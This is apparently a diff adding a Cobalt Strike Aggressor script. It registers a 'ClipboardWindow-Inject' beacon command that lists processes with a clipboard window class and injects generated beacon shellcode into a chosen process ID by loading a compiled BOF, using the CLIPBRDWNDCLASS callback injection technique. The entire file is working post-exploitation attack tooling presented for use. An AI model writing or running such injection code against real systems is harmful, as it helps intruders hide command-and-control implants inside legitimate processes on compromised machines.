@@ -1,0 +1,39 @@
+beacon_command_register(
+	"ClipboardWindow-Inject", 
+	"CLIPBRDWNDCLASS injection technique - set prop to an IUnknown interface address,and post a message to trigger the callback function",
+	"Synopsis: 1.ClipboardWindow-Inject list	(list processes with clipboard window class)
+	 2.ClipboardWindow-Inject <pid> <listener>	(inject beacon shellcode into target process)"
+);
+
+
+alias ClipboardWindow-Inject{
+	local('$bid $listener $pid $payload');
+	($bid,$opcode,$listener) = @_;
+	$handle = openf(script_resource("ClipboardWindow-Inject.x64.o"));
+	$data = readb($handle,-1);
+	closef($handle);
+
+
+	if (size(@_) == 2 && "list" eq $opcode){
+		btask($1,"tasked beacon to list processes with clipboard window class");
+		$args = bof_pack($bid, "i", 0);
+		beacon_inline_execute($1,$data,"go",$args);
+	}
+	else if (size(@_) == 3){
+    		$payload = payload_local($bid, $listener, "x64", "thread");
+		if($payload eq $null){
+			berror($bid, "Failed to generate beacon payload, check the listener");
+			return;	
+		}
+
+		$args = bof_pack($bid, "ib", $opcode, $payload);
+		btask($1,"tasked beacon to inject into target process, pid: $opcode");
+		beacon_inline_execute($1,$data,"go",$args);		
+	}
+	else
+	{
+		berror($bid, "Usage:1.ClipboardWindow-Inject list\n          2.ClipboardWindow-Inject <pid> <listener>");
+		return;
+	}
+
+}
